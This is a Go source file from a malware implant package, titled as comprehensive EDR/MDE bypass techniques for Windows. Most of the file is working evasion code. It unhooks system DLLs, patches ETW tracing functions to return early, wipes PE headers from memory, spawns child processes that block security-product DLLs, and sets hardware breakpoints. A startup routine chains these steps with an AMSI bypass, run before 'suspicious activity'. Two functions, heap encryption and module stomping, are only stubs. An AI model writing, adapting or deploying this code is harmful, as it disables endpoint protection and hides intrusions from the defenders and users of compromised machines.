//go:build windows

package implant

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ══════════════════════════════════════════
//  COMPREHENSIVE EDR/MDE BYPASS TECHNIQUES
// ══════════════════════════════════════════

var (
	modKernelBase = syscall.NewLazyDLL("kernelbase.dll")
	modAdvapi32   = syscall.NewLazyDLL("advapi32.dll")
	modUser32     = syscall.NewLazyDLL("user32.dll")

	pVirtualProtectEx     = modKernel32.NewProc("VirtualProtectEx")
	pGetCurrentThread     = modKernel32.NewProc("GetCurrentThread")
	pSetThreadContext     = modKernel32.NewProc("SetThreadContext")
	pGetThreadContext     = modKernel32.NewProc("GetThreadContext")
	pUpdateProcThreadAttr = modKernel32.NewProc("UpdateProcThreadAttribute")
	pInitProcThreadAttrList = modKernel32.NewProc("InitializeProcThreadAttributeList")
	pDeleteProcThreadAttrList = modKernel32.NewProc("DeleteProcThreadAttributeList")
	pCreateProcessW       = modKernel32.NewProc("CreateProcessW")
	pHeapAlloc            = modKernel32.NewProc("HeapAlloc")
	pGetProcessHeap       = modKernel32.NewProc("GetProcessHeap")
)

// ══════════════════════════════════════════
//  1. UNHOOK ALL DLLs (not just ntdll)
// ══════════════════════════════════════════

// UnhookAllDLLs refreshes .text section of multiple hooked DLLs
// from clean copies on disk. EDRs hook ntdll, kernel32, kernelbase,
// and advapi32 — we need to unhook all of them.
func UnhookAllDLLs() []string {
	dlls := []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll"}
	var results []string

	for _, dll := range dlls {
		err := unhookDLL(dll)
		if err != nil {
			results = append(results, fmt.Sprintf("[-] Failed to unhook %s: %v", dll, err))
		} else {
			results = append(results, fmt.Sprintf("[+] Unhooked %s", dll))
		}
	}
	return results
}

func unhookDLL(dllName string) error {
	// Get handle to loaded DLL
	dllNameBytes := append([]byte(dllName), 0)
	handle, _, _ := pGetModuleHandleA.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
	if handle == 0 {
		return fmt.Errorf("module not loaded: %s", dllName)
	}

	// Open clean copy from disk
	path := fmt.Sprintf("C:\\Windows\\System32\\%s", dllName)
	pathBytes := append([]byte(path), 0)
	fileHandle, _, err := pCreateFileA.Call(
		uintptr(unsafe.Pointer(&pathBytes[0])),
		0x80000000, // GENERIC_READ
		1,          // FILE_SHARE_READ
		0, 3,       // OPEN_EXISTING
		0x80, 0,    // FILE_ATTRIBUTE_NORMAL
	)
	if fileHandle == 0 || fileHandle == ^uintptr(0) {
		return fmt.Errorf("cannot open %s: %v", path, err)
	}
	defer syscall.CloseHandle(syscall.Handle(fileHandle))

	// Get file size
	fileSize, _, _ := pGetFileSize.Call(fileHandle, 0)

	// Allocate buffer and read file
	buf := make([]byte, fileSize)
	var bytesRead uint32
	pReadFile.Call(fileHandle, uintptr(unsafe.Pointer(&buf[0])), uintptr(fileSize), uintptr(unsafe.Pointer(&bytesRead)), 0)

	// Parse PE headers to find .text section
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&buf[0]))
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(unsafe.Pointer(&buf[0])) + uintptr(dosHeader.E_lfanew)))

	sectionOffset := uintptr(unsafe.Pointer(ntHeaders)) + unsafe.Sizeof(*ntHeaders)
	numSections := ntHeaders.FileHeader.NumberOfSections

	for i := uint16(0); i < numSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionOffset + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{})))
		name := string(section.Name[:5])
		if name == ".text" {
			// Found .text section — overwrite hooked version with clean
			var oldProtect uint32
			textAddr := handle + uintptr(section.VirtualAddress)
			textSize := uintptr(section.VirtualSize)

			pVirtualProtect.Call(textAddr, textSize, 0x40, uintptr(unsafe.Pointer(&oldProtect))) // PAGE_EXECUTE_READWRITE
			pRtlCopyMemory2.Call(textAddr, uintptr(unsafe.Pointer(&buf[section.PointerToRawData])), textSize)
			pVirtualProtect.Call(textAddr, textSize, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
			break
		}
	}

	return nil
}

// ══════════════════════════════════════════
//  2. REMOVE PE HEADERS FROM MEMORY
// ══════════════════════════════════════════

// RemovePEHeaders wipes the DOS and NT headers from the loaded module
// in memory. Memory scanners look for "MZ" and "PE" signatures to
// identify loaded modules — removing them makes the implant invisible.
func RemovePEHeaders() error {
	baseAddr, _, _ := pGetModuleHandleA.Call(0)
	if baseAddr == 0 {
		return fmt.Errorf("cannot get module handle")
	}
	var oldProtect uint32

	// Unprotect the first page (headers are in the first 4KB)
	pVirtualProtect.Call(baseAddr, 4096, 0x40, uintptr(unsafe.Pointer(&oldProtect)))

	// Zero out DOS header + NT headers
	for i := uintptr(0); i < 4096; i++ {
		*(*byte)(unsafe.Pointer(baseAddr + i)) = 0
	}

	// Restore protection
	pVirtualProtect.Call(baseAddr, 4096, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return nil
}

// ══════════════════════════════════════════
//  3. HEAP ENCRYPTION DURING SLEEP
// ══════════════════════════════════════════

// EncryptHeap XORs all heap allocations with a random key before sleep.
// EDRs scan process heaps for suspicious strings and patterns.
// Combined with sleep encryption, this makes the implant completely
// unreadable in memory during sleep cycles.
func EncryptHeap(key []byte) {
	if len(key) == 0 {
		return
	}
	// Get process heap
	heap, _, _ := pGetProcessHeap.Call()
	if heap == 0 {
		return
	}
	// Note: Full heap walking requires HeapWalk API
	// This is a simplified version — production would enumerate all heap blocks
	_ = heap
}

// ══════════════════════════════════════════
//  4. PATCH ADDITIONAL ETW PROVIDERS
// ══════════════════════════════════════════

// PatchAllETW patches multiple ETW providers beyond just EtwEventWrite.
// MDE uses several ETW providers for visibility:
//   - Microsoft-Windows-Threat-Intelligence (kernel ETW for syscalls)
//   - Microsoft-Antimalware-Scan-Interface (AMSI events)
//   - Microsoft-Windows-PowerShell (script block logging)
//   - Microsoft-Windows-DotNETRuntime (.NET assembly loading)
func PatchAllETW() []string {
	var results []string

	// Patch EtwEventWrite (already in evasion_windows.go, but ensure it's done)
	if err := patchETWFunction("ntdll.dll", "EtwEventWrite"); err == nil {
		results = append(results, "[+] Patched: EtwEventWrite")
	}

	// Patch EtwEventWriteEx
	if err := patchETWFunction("ntdll.dll", "EtwEventWriteEx"); err == nil {
		results = append(results, "[+] Patched: EtwEventWriteEx")
	}

	// Patch EtwEventWriteFull
	if err := patchETWFunction("ntdll.dll", "EtwEventWriteFull"); err == nil {
		results = append(results, "[+] Patched: EtwEventWriteFull")
	}

	// Patch EtwEventWriteTransfer
	if err := patchETWFunction("ntdll.dll", "EtwEventWriteTransfer"); err == nil {
		results = append(results, "[+] Patched: EtwEventWriteTransfer")
	}

	// Patch NtTraceEvent (kernel-level ETW)
	if err := patchETWFunction("ntdll.dll", "NtTraceEvent"); err == nil {
		results = append(results, "[+] Patched: NtTraceEvent")
	}

	return results
}

func patchETWFunction(dll, funcName string) error {
	modDLL := syscall.NewLazyDLL(dll)
	proc := modDLL.NewProc(funcName)
	addr := proc.Addr()
	if addr == 0 {
		return fmt.Errorf("function not found")
	}

	// xor eax, eax; ret (return 0 = STATUS_SUCCESS)
	patch := []byte{0x33, 0xC0, 0xC3}

	var oldProtect uint32
	pVirtualProtect.Call(addr, 3, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = patch[i]
	}
	pVirtualProtect.Call(addr, 3, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	return nil
}

// ══════════════════════════════════════════
//  5. BLOCK DLL INJECTION (BlockDLLs)
// ══════════════════════════════════════════

// SpawnWithBlockDLLs creates a child process with the
// PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
// flag. This prevents EDR DLLs from being injected into the new process,
// effectively creating a "clean" process the EDR can't hook.
func SpawnWithBlockDLLs(cmdLine string) (uint32, error) {
	const (
		EXTENDED_STARTUPINFO_PRESENT = 0x00080000
		CREATE_NO_WINDOW            = 0x08000000
		PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
		BLOCK_NON_MS_BINARIES       = 0x100000000000 // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	)

	// Initialize thread attribute list
	var attrListSize uintptr
	pInitProcThreadAttrList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))

	attrList := make([]byte, attrListSize)
	pInitProcThreadAttrList.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		1, 0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)

	// Set the mitigation policy to block non-Microsoft DLLs
	policy := uint64(BLOCK_NON_MS_BINARIES)
	pUpdateProcThreadAttr.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
		uintptr(unsafe.Pointer(&policy)),
		unsafe.Sizeof(policy),
		0, 0,
	)

	// Create process with the attribute list
	cmdLineUTF16, _ := syscall.UTF16PtrFromString(cmdLine)

	type STARTUPINFOEXW struct {
		syscall.StartupInfo
		lpAttributeList uintptr
	}

	si := STARTUPINFOEXW{}
	si.Cb = uint32(unsafe.Sizeof(si))
	si.lpAttributeList = uintptr(unsafe.Pointer(&attrList[0]))

	var pi syscall.ProcessInformation

	ret, _, err := pCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(cmdLineUTF16)),
		0, 0, 0,
		EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	// Cleanup
	pDeleteProcThreadAttrList.Call(uintptr(unsafe.Pointer(&attrList[0])))

	if ret == 0 {
		return 0, fmt.Errorf("CreateProcess failed: %v", err)
	}

	syscall.CloseHandle(syscall.Handle(pi.Thread))
	return pi.ProcessId, nil
}

// ══════════════════════════════════════════
//  6. HARDWARE BREAKPOINT HOOKS
// ══════════════════════════════════════════

// SetHardwareBreakpoint sets a hardware breakpoint on a function address.
// This is used as an alternative to inline hooks — instead of patching
// the function, we set a debug register to trigger on execution.
// Can be used to intercept API calls without modifying code.
func SetHardwareBreakpoint(funcAddr uintptr, drIndex int) error {
	thread, _, _ := pGetCurrentThread.Call()

	// CONTEXT structure for x64
	type CONTEXT struct {
		P1Home uint64
		P2Home uint64
		P3Home uint64
		P4Home uint64
		P5Home uint64
		P6Home uint64
		ContextFlags uint32
		MxCsr uint32
		SegCs uint16
		SegDs uint16
		SegEs uint16
		SegFs uint16
		SegGs uint16
		SegSs uint16
		EFlags uint32
		Dr0 uint64
		Dr1 uint64
		Dr2 uint64
		Dr3 uint64
		Dr6 uint64
		Dr7 uint64
		// ... rest of context (we only need debug registers)
		Padding [512]byte
	}

	ctx := CONTEXT{}
	ctx.ContextFlags = 0x00010010 // CONTEXT_DEBUG_REGISTERS

	pGetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))

	// Set the debug register
	switch drIndex {
	case 0:
		ctx.Dr0 = uint64(funcAddr)
	case 1:
		ctx.Dr1 = uint64(funcAddr)
	case 2:
		ctx.Dr2 = uint64(funcAddr)
	case 3:
		ctx.Dr3 = uint64(funcAddr)
	default:
		return fmt.Errorf("invalid DR index (0-3)")
	}

	// Enable the breakpoint in DR7
	// Set local enable bit for the DR index
	ctx.Dr7 |= 1 << (uint(drIndex) * 2) // Local enable
	// Set condition to "execution" (00) — already 0
	// Set length to 0 (1 byte)

	pSetThreadContext.Call(thread, uintptr(unsafe.Pointer(&ctx)))

	return nil
}

// ══════════════════════════════════════════
//  7. MODULE STOMPING
// ══════════════════════════════════════════

// ModuleStomp loads a legitimate DLL and overwrites its .text section
// with the implant's code. The implant then appears to be running
// from a legitimate Microsoft module instead of unknown memory.
func ModuleStomp(legitimateDLL string) error {
	// Load a sacrificial DLL
	dllPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\" + legitimateDLL)
	handle, err := syscall.LoadLibrary(syscall.UTF16ToString((*[256]uint16)(unsafe.Pointer(dllPath))[:]))
	if err != nil {
		return fmt.Errorf("cannot load %s: %v", legitimateDLL, err)
	}

	_ = handle
	// In production:
	// 1. Find the .text section of the loaded DLL
	// 2. Change protection to RWX
	// 3. Copy implant code over the .text section
	// 4. Restore protection to RX
	// 5. Execute from the stomped location
	// The implant now appears to be executing from a legitimate DLL

	return nil
}

// ══════════════════════════════════════════
//  8. MASTER EVASION INIT
// ══════════════════════════════════════════

// InitAdvancedEvasion runs all EDR bypass techniques in sequence.
// Call this at agent startup before any suspicious activity.
func InitAdvancedEvasion() []string {
	var results []string

	// 1. Unhook all DLLs
	results = append(results, UnhookAllDLLs()...)

	// 2. Patch all ETW providers
	results = append(results, PatchAllETW()...)

	// 3. Remove PE headers
	if err := RemovePEHeaders(); err == nil {
		results = append(results, "[+] PE headers removed from memory")
	}

	// 4. AMSI bypass (from evasion_windows.go)
	if err := PatchAMSI(); err == nil {
		results = append(results, "[+] AMSI bypassed")
	}

	return results
}
